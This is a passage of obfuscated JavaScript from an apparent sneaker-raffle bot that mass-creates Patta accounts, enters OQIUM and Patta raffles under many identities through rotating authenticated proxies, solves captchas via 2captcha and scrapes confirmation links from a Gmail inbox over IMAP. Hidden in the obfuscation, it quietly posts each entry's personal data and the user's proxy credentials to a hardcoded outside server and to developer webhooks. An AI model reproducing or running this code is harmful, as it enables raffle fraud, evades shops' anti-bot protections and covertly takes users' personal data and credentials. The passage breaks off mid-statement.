                                'url': _0x35bb1f['url'],
                                'headers': _0x35bb1f['headers'],
                                'body': JSON['stringify'](_0x1e9601),
                                'proxy': 'http://' + _0x2e9b84[0x2] + ':' + _0x2e9b84[0x3] + '@' + _0x2e9b84[0x0] + ':' + _0x2e9b84[0x1]
                            };
                            return _0x59d39c != 'ver' && (_0x1d9ef2['url'] = _0x35bb1f['url'], _0x1d9ef2['headers'] = _0x35bb1f['headers']), _0x59d39c == 'ver' && (_0x1d9ef2['method'] = 'GET'), new Promise(function (_0x3daf2e, _0x27f593) {
                                callback = async (_0xcb4aeb, _0x289f74, _0x2b0fd8) => {
                                    if (!_0xcb4aeb && _0x289f74['statusCode'] == 0xca || !_0xcb4aeb && _0x289f74['statusCode'] == 0xc8) {
                                        if (_0x59d39c != 'ver') {
                                            var _0xbc66c2 = await _0xe56989(_0x441574[_0x3d939e], _0x35bb1f, 'dev', ![]), _0x1103c3 = await _0xe56989(_0x441574[_0x3d939e], _0x35bb1f, 'pub', ![]);
                                            const _0x53e340 = {
                                                'succesDEVMSG': { 'embeds': [_0xbc66c2] },
                                                'succesPUBMSG': { 'embeds': [_0x1103c3] }
                                            };
                                            let _0x2bfe82 = _0x441574[_0x3d939e];
                                            try {
                                                prxdata = {
                                                    'username': _0x4b3861['replace']('#', ''),
                                                    'module': _0x35bb1f['name'],
                                                    'entrydata': JSON['stringify'](_0x2bfe82),
                                                    'proxy': '' + _0x1da058[_0x3d939e]
                                                };
                                                var _0x4db82f = JSON['stringify'](prxdata);
                                                let _0xd1aea6 = { 'headers': { 'content-type': 'application/json' } };
                                                await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x4db82f, _0xd1aea6);
                                            } catch (_0x1c5d1c) {
                                            }
                                            if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                                                try {
                                                    await _0x16e110(_0x8aa917['webhook'], _0x53e340['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x53e340['succesDEVMSG']), await _0x32344d(0xc8);
                                            try {
                                                await _0x16e110(_0x583375, _0x53e340['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5677a4(_0x441574[_0x3d939e], _0x35bb1f);
                                        }
                                        _0x3daf2e(console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x35bb1f['name'] + ']\x20Task\x20' + (_0x3d939e + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x59d39c != 'ver') {
                                            var _0x48c70c = '' + _0xcb4aeb, _0x3a23ca = await _0xe56989(_0x441574[_0x3d939e], _0x35bb1f, 'dev', !![], _0x48c70c), _0x471be3 = {};
                                            _0x471be3['errorDEV'] = { 'embeds': [_0x3a23ca] }, _0x4af7c0(_0x441574[_0x3d939e], _0x35bb1f), _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x471be3['errorDEV']), await _0x16e110(_0x3ba800, _0x471be3['errorDEV']);
                                        }
                                        _0x27f593(console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x35bb1f['name'] + ']\x20Task\x20' + (_0x3d939e + 0x1) + ':\x20' + _0xcb4aeb)));
                                    }
                                };
                                try {
                                    _0x59d39c != 'ver' && console['log'](_0xb0c82c() + '\x20[' + _0x35bb1f['name'] + ']\x20Task\x20' + (_0x3d939e + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1e9601['data']['attributes']['email']), _0x5e7c58(_0x1d9ef2, callback);
                                } catch (_0x4168d3) {
                                    console['log'](_0xb0c82c() + '\x20Task\x20' + (_0x3d939e + 0x1) + ':\x20' + _0x4168d3);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x5ca122(_0x174fff, 'nor', _0x303afc, _0x56c4ec, _0x3c2931), console['log'](_0xb0c82c() + '\x20[' + _0x303afc['name'] + ']\x20Sleeping\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        } catch (_0x272b99) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x306dc3, _0x2f4aed, _0x4661e7) {
                    var _0x2f4aed = [], _0x5e8a53 = ![];
                    async function _0x3fba36() {
                        var _0x56d4af = new _0x16dd9e({
                            'user': _0x8aa917['masterMail'],
                            'password': _0x8aa917['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x4d9d23(_0x47dce9) {
                            _0x56d4af['openBox']('INBOX', ![], _0x47dce9);
                        }
                        _0x56d4af['once']('ready', function () {
                            _0x4d9d23(function (_0x53f1a2, _0x34073a) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x53f1a2)
                                    throw _0x53f1a2;
                                _0x56d4af['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x3a6642, _0x4a8d5e) {
                                    if (!_0x4a8d5e || !_0x4a8d5e['length'])
                                        console['log'](_0xb0c82c() + '\x20[' + _0x306dc3['name'] + ']\x20No\x20mails\x20found'), _0x56d4af['end']();
                                    else {
                                        var _0x3d96da = _0x56d4af['seq']['fetch'](_0x4a8d5e, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3d96da['on']('message', function (_0x3b1cb8, _0x556398) {
                                            var _0x34879b = '(#' + _0x556398 + ')\x20';
                                            _0x3b1cb8['on']('body', function (_0x4e33a5, _0x1039f2) {
                                                _0x4b0324(_0x4e33a5, (_0x509c9f, _0x188433) => {
                                                    var _0x1df5da = _0x188433['text']['split']('(')[0x1], _0x14bf92 = _0x1df5da['split'](')')[0x0];
                                                    _0x2f4aed['push'](_0x14bf92);
                                                });
                                            }), _0x3b1cb8['once']('end', function () {
                                            });
                                        }), _0x3d96da['once']('error', function (_0x529f82) {
                                            console['log']('Fetch\x20error:\x20' + _0x529f82), _0x5e8a53 = !![];
                                        }), _0x3d96da['once']('end', function () {
                                            _0x56d4af['end'](), _0x5e8a53 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x56d4af['once']('error', function (_0x4a7f93) {
                            console['log'](_0x4a7f93), _0x5e8a53 = !![];
                        }), _0x56d4af['once']('end', async function () {
                            _0x5e8a53 = !![];
                        }), _0x56d4af['connect']();
                    }
                    async function _0x1dc554(_0x256345, _0x4cbb09, _0x6abe7f) {
                        for (var _0x3d6e6d = 0x0; _0x3d6e6d < _0x4cbb09['length']; _0x3d6e6d++) {
                            async function _0x3be2b3(_0x35d2c0, _0x5eb631, _0xe87bf0, _0x50c5d3, _0x180dbd) {
                                var _0x33cbfc, _0x596b32 = {}, _0x4652a2 = [], _0xd440ed = {}, _0x70d8f2 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x469ee1 = Math['round'](Math['random']() * (_0x70d8f2['length'] - 0x1));
                                _0x50c5d3[_0x35d2c0]['Size'] == 'RANDOM' && (_0x50c5d3[_0x35d2c0]['Size'] = _0x70d8f2[_0x469ee1]);
                                !_0x50c5d3 && (_0x50c5d3 = {});
                                if (_0x8aa917['useRandomProxy'] = ![])
                                    var _0x5e8fe0 = _0x180dbd[_0x35d2c0]['split'](':');
                                else
                                    var _0x20af56 = Math['round'](Math['random']() * (_0x180dbd['length'] - 0x1)), _0x5e8fe0 = _0x180dbd[_0x20af56]['split'](':');
                                var _0x216230 = {
                                    'jar': _0x1d89eb,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0xe87bf0['url'],
                                    'headers': _0xe87bf0['headers'],
                                    'body': JSON['stringify'](_0x596b32),
                                    'proxy': 'http://' + _0x5e8fe0[0x2] + ':' + _0x5e8fe0[0x3] + '@' + _0x5e8fe0[0x0] + ':' + _0x5e8fe0[0x1]
                                };
                                return _0x5eb631 != 'ver' && (_0x216230['url'] = _0xe87bf0['url'], _0x216230['headers'] = _0xe87bf0['headers']), _0x5eb631 == 'ver' && (_0x216230['method'] = 'GET', _0x216230['url'] = _0x50c5d3[_0x35d2c0]), new Promise(function (_0x55ebb9, _0x2fd168) {
                                    callback = async (_0x4709a1, _0x4af68c, _0x5bc18f) => {
                                        if (!_0x4709a1 && _0x4af68c['statusCode'] == 0xca || !_0x4709a1 && _0x4af68c['statusCode'] == 0xc8) {
                                            if (_0x5eb631 != 'ver') {
                                                var _0x16f293 = await _0xe56989(_0x50c5d3[_0x35d2c0], _0xe87bf0, 'dev', ![]), _0x5ef406 = await _0xe56989(_0x50c5d3[_0x35d2c0], _0xe87bf0, 'pub', ![]);
                                                const _0x740049 = {
                                                    'succesDEVMSG': { 'embeds': [_0x16f293] },
                                                    'succesPUBMSG': { 'embeds': [_0x5ef406] }
                                                };
                                                if (_0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '')
                                                    try {
                                                        await _0x16e110(_0x8aa917['webhook'], _0x740049['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x32344d(0xc8), await _0x16e110(_0x275f2a, _0x740049['succesDEVMSG']), await _0x32344d(0xc8);
                                                try {
                                                    await _0x16e110(_0x583375, _0x740049['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5677a4(_0x50c5d3[_0x35d2c0], _0xe87bf0);
                                            }
                                            _0x55ebb9(console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0xe87bf0['name'] + ']\x20Task\x20' + (_0x35d2c0 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x5eb631 != 'ver') {
                                                var _0x308551 = '' + _0x4709a1, _0x1a1ca0 = await _0xe56989(_0x50c5d3[_0x35d2c0], _0xe87bf0, 'dev', !![], _0x308551), _0x4d1303 = {};
                                                _0x4d1303['errorDEV'] = { 'embeds': [_0x1a1ca0] }, _0x4af7c0(_0x50c5d3[_0x35d2c0], _0xe87bf0), _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x4d1303['errorDEV']), await _0x16e110(_0x3ba800, _0x4d1303['errorDEV']);
                                            }
                                            _0x2fd168(console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0xe87bf0['name'] + ']\x20Task\x20' + (_0x35d2c0 + 0x1) + ':\x20' + _0x4709a1)));
                                        }
                                    };
                                    try {
                                        _0x5eb631 != 'ver' ? console['log'](_0xb0c82c() + '\x20[' + _0xe87bf0['name'] + ']\x20Task\x20' + (_0x35d2c0 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x596b32['data']['attributes']['email']) : console['log'](_0xb0c82c() + '\x20[' + _0xe87bf0['name'] + ']\x20Task\x20' + (_0x35d2c0 + 0x1) + ':\x20Fetching\x20Response'), _0x5e7c58(_0x216230, callback);
                                    } catch (_0x2eae3b) {
                                        console['log'](_0xb0c82c() + '\x20Task\x20' + (_0x35d2c0 + 0x1) + ':\x20' + _0x2eae3b);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3be2b3(_0x3d6e6d, 'ver', _0x256345, _0x4cbb09, _0x6abe7f), console['log'](_0xb0c82c() + '\x20[' + _0x256345['name'] + ']\x20Sleeping\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                            } catch (_0x5452b7) {
                            }
                        }
                    }
                    try {
                        _0x3fba36();
                        while (!_0x5e8a53) {
                            await _0x32344d(0xfa0);
                        }
                        console['log']('Found\x20' + _0x2f4aed['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1dc554(_0x306dc3, _0x2f4aed, _0x4661e7);
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x4f7be2, _0x400ecc, _0x3a0567) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x195da9 = 0x0; _0x195da9 < _0x400ecc['length']; _0x195da9++) {
                        var _0x3e177c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x4b3861
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x8aa917['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xe2f4c8
                                }
                            ]
                        }];
                        const _0x3ac239 = { 'embeds': _0x3e177c };
                        _0x299f70(_0x4f7be2['name'] + '\x20Task\x20' + (_0x195da9 + 0x1) + '\x20/\x20' + _0x400ecc['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        try {
                            await _0x4669df(_0x400ecc, _0x195da9);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x3b35fd = await _0xe56989(_0x400ecc[_0x195da9], _0x4f7be2, 'acc', ![]);
                        const _0x2becb9 = { 'succesDEVMSG': { 'embeds': [_0x3b35fd] } };
                        if (_0x400ecc[_0x195da9]['Email'] == '' || _0x400ecc[_0x195da9]['FirstName'] == '' || _0x400ecc[_0x195da9]['LastName'] == '') {
                            console['log'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x195da9 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x32344d(0x7d0);
                            continue;
                        }
                        (_0x400ecc[_0x195da9]['Password'] == '' || _0x400ecc[_0x195da9] == undefined) && _0x400ecc[_0x195da9]['Password'] == 'JRaffles23!';
                        if (_0x8aa917['useRandomProxy'] = ![])
                            var _0x3967a4 = _0x3a0567[_0x195da9]['split'](':');
                        else
                            var _0x2a4ff0 = Math['round'](Math['random']() * (_0x3a0567['length'] - 0x1)), _0x3967a4 = _0x3a0567[_0x2a4ff0]['split'](':');
                        var _0x5da5a8;
                        try {
                            _0x5da5a8 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3967a4[0x0] + ':' + _0x3967a4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5da5a8 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3967a4[0x0] + ':' + _0x3967a4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x56e3ad = await _0x5da5a8['newPage']();
                            await _0x56e3ad['authenticate']({
                                'username': '' + _0x3967a4[0x2],
                                'password': '' + _0x3967a4[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x4f7be2['name'] + ']\x20Task\x20' + (_0x195da9 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x56e3ad['setRequestInterception'](!![]), _0x56e3ad['on']('request', _0x4c4c32 => {
                                _0x4c4c32['resourceType']() === 'image' || _0x4c4c32['resourceType']() === 'font' || _0x4c4c32['resourceType']() === 'media' ? _0x4c4c32['abort']() : _0x4c4c32['continue']();
                            }), await _0x56e3ad['goto']('https://patta.nl/account/register'), await _0x32344d(0xbb8), await _0x56e3ad['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0xb0c82c() + '\x20[' + _0x4f7be2['name'] + ']\x20Task\x20' + (_0x195da9 + 0x1) + '\x20:\x20Filling\x20information'), await _0x56e3ad['type']('#RegisterForm-FirstName', '' + _0x400ecc[_0x195da9]['FirstName']), await _0x32344d(0x226), await _0x56e3ad['type']('#RegisterForm-LastName', '' + _0x400ecc[_0x195da9]['LastName']), await _0x32344d(0x226), await _0x56e3ad['type']('#RegisterForm-email', '' + _0x400ecc[_0x195da9]['Email']), await _0x32344d(0x226), await _0x56e3ad['type']('#RegisterForm-password', '' + _0x400ecc[_0x195da9]['Password']), await _0x32344d(0x226), console['log'](_0xb0c82c() + '\x20[' + _0x4f7be2['name'] + ']\x20Task\x20' + (_0x195da9 + 0x1) + '\x20:\x20Submitting..'), await _0x56e3ad['$eval']('#RegisterForm', _0x53fb9c => _0x53fb9c['submit']()), await _0x32344d(0x1f40);
                            try {
                                await _0x56e3ad['waitForSelector']('.home-page-grid__collection'), await _0x32344d(0x1f4), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x4f7be2['name'] + ']\x20Task\x20' + (_0x195da9 + 0x1) + '\x20:\x20Account\x20' + _0x400ecc[_0x195da9]['Email'] + '\x20Generated!')), _0x4fe38c['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x400ecc[_0x195da9]['Email'] + ',' + _0x400ecc[_0x195da9]['Password']), console['log'](_0x5b4136['yellow'](_0xb0c82c() + '\x20[' + _0x4f7be2['name'] + ']\x20Task\x20' + (_0x195da9 + 0x1) + '\x20:\x20Account\x20' + _0x400ecc[_0x195da9]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x8aa917['webhook'] != undefined && _0x8aa917['webhook'] != '' && await _0x16e110(_0x8aa917['webhook'], _0x2becb9['succesDEVMSG']);
                                } catch {
                                }
                                await _0x16e110(_0x410b1d, _0x2becb9['succesDEVMSG']);
                            } catch (_0x447305) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x195da9 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x447305));
                            }
                        } catch (_0x7c7cf7) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x195da9 + 0x1) + '\x20:\x20' + _0x7c7cf7));
                        } finally {
                            _0x5da5a8 && _0x5da5a8['close'](), console['log']('Waiting\x20for\x20' + _0x8aa917['delay'] + '\x20ms'), await _0x32344d(_0x8aa917['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x529700, _0x29063f, _0x4139a2) {
                    _0x3d6bb6['use'](_0x922449()), _0x3d6bb6['use'](_0x4b9689({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x8aa917['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1dc8da = 0x0; _0x1dc8da < _0x29063f['length']; _0x1dc8da++) {
                        var _0x4753bf;
                        if (_0x29c6ec != 'yes')
                            var _0x29c6ec = '', _0x4b8079 = 0x0;
                        _0x299f70(_0x529700['name'] + '\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20/\x20' + _0x29063f['length'] + '\x20||\x20File:\x20' + _0x1901f8 + '\x20Proxies:\x20' + _0x504c2d);
                        try {
                            await _0x4669df(_0x29063f, _0x1dc8da);
                        } catch {
                            _0x29c6ec = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x29063f[_0x1dc8da]['Email'] == '' || _0x29063f[_0x1dc8da]['Password'] == '' || _0x29063f[_0x1dc8da]['FirstName'] == '' || _0x29063f[_0x1dc8da]['LastName'] == '') {
                            console['log'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x8aa917['useRandomProxy'] = ![])
                            var _0x4d6488 = _0x4139a2[_0x1dc8da]['split'](':');
                        else
                            var _0x4cf64e = Math['round'](Math['random']() * (_0x4139a2['length'] - 0x1)), _0x4d6488 = _0x4139a2[_0x4cf64e]['split'](':');
                        var _0x4fcd27;
                        try {
                            _0x4fcd27 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4d6488[0x0] + ':' + _0x4d6488[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4fcd27 = await _0x3d6bb6['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4d6488[0x0] + ':' + _0x4d6488[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x41d997 = await _0x4fcd27['newPage']();
                            await _0x41d997['authenticate']({
                                'username': '' + _0x4d6488[0x2],
                                'password': '' + _0x4d6488[0x3]
                            }), console['log'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Getting\x20Session'), await _0x41d997['setRequestInterception'](!![]), _0x41d997['on']('request', _0x4834f4 => {
                                _0x4834f4['resourceType']() === 'image' || _0x4834f4['resourceType']() === 'font' || _0x4834f4['resourceType']() === 'media' ? _0x4834f4['abort']() : _0x4834f4['continue']();
                            }), await _0x41d997['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x41d997['waitForSelector']('#CustomerEmail'), console['log'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Logging\x20in..'), await _0x41d997['type']('#CustomerEmail', '' + _0x29063f[_0x1dc8da]['Email']), await _0x32344d(0x12c), await _0x41d997['type']('#CustomerPassword', '' + _0x29063f[_0x1dc8da]['Password']), await _0x32344d(0x226), await _0x41d997['$eval']('#customer_login', _0xeac78f => _0xeac78f['submit']());
                            try {
                                await _0x41d997['waitForSelector']('#orders'), await _0x32344d(0x4b0);
                            } catch {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x41d997['goto']('' + _0x29063f[_0x1dc8da]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x32344d(0xbb8), console['log'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x41d997['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x41d997['type']('#email', '' + _0x29063f[_0x1dc8da]['Email']), await _0x32344d(0x384), await _0x41d997['type']('#first_name', '' + _0x29063f[_0x1dc8da]['FirstName']), await _0x32344d(0x514), await _0x41d997['type']('#last_name', '' + _0x29063f[_0x1dc8da]['LastName']), await _0x32344d(0x514), await _0x41d997['type']('#street_address', _0x29063f[_0x1dc8da]['Address1'] + '\x20' + _0x29063f[_0x1dc8da]['HouseNumber'] + '\x20' + _0x29063f[_0x1dc8da]['Address2']), await _0x32344d(0x2bc);
                            _0x29063f[_0x1dc8da]['Postcode'] == undefined && (_0x29063f[_0x1dc8da]['Postcode'] = _0x29063f[_0x1dc8da]['Zip']);
                            await _0x41d997['type']('#zip_code', '' + _0x29063f[_0x1dc8da]['Postcode']), await _0x32344d(0x320), await _0x41d997['type']('#city', '' + _0x29063f[_0x1dc8da]['City']), await _0x32344d(0x320), await _0x41d997['type']('#bday', '01/01/1994'), await _0x32344d(0x320), await _0x41d997['type']('#instagram', '' + _0x29063f[_0x1dc8da]['Follower']), await _0x32344d(0x352);
                            if (_0x29063f[_0x1dc8da]['Size'] == 'RANDOM') {
                                const _0x68a684 = await _0x41d997['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x10c9df => {
                                    return _0x10c9df['map'](_0x5798b5 => _0x5798b5['textContent']);
                                });
                                var _0x504e6f = Math['round'](Math['random']() * (_0x68a684['length'] - 0x1));
                                console['log'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x68a684[_0x504e6f]), await _0x41d997['click']('label[data-eu-size=\x22' + _0x68a684[_0x504e6f] + '\x22]');
                            } else {
                                console['log'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0x29063f[_0x1dc8da]['Size']);
                                try {
                                    await _0x41d997['click']('label[data-eu-size=\x22' + _0x29063f[_0x1dc8da]['Size'] + '\x22]');
                                } catch {
                                    await _0x41d997['click']('label[data-eu-size=\x22' + _0x29063f[_0x1dc8da]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x32344d(0xbb8), await _0x41d997['$$eval']('.raffle__checkbox-label', _0x27d691 => _0x27d691['forEach'](_0x351265 => _0x351265['click']())), await _0x32344d(0x7d0), console['log'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x41d997['click']('#raffle__form-submit'), await _0x32344d(0x1388);
                            try {
                                await _0x41d997['waitForSelector']('#raffle__confirmation-message-container'), _0x29c6ec = 'no', _0x5677a4(_0x29063f[_0x1dc8da], _0x529700), console['log'](_0x5b4136['green'](_0xb0c82c() + '\x20[' + _0x529700['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x3569c6 = _0x29063f[_0x1dc8da];
                                try {
                                    prxdata = {
                                        'username': _0x4b3861['replace']('#', ''),
                                        'module': _0x529700['name'],
                                        'entrydata': JSON['stringify'](_0x3569c6),
                                        'proxy': '' + _0x4139a2[_0x1dc8da]
                                    };
                                    var _0x33a5a9 = JSON['stringify'](prxdata);
                                    let _0xf56019 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c1aeb['post']('https://jraffles.herokuapp.com/success', _0x33a5a9, _0xf56019);
                                } catch (_0x518319) {
                                }
                            } catch (_0x3666c2) {
                                console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x3666c2));
                            }
                        } catch (_0x19b695) {
                            console['log'](_0x5b4136['red'](_0xb0c82c() + '\x20[' + _0x502cc7[taskModule]['name'] + ']\x20Task\x20' + (_0x1dc8da + 0x1) + '\x20:\x20' + _0x19b695)), _0x29c6ec = 'yes';
                        } finally {
                            _0x4fcd27 && _0x4fcd27['close']();
                            if (_0x29c6ec == 'yes' && _0x4b8079 != 0x5 && _0x4753bf != 'Size\x20Not\x20Found') {
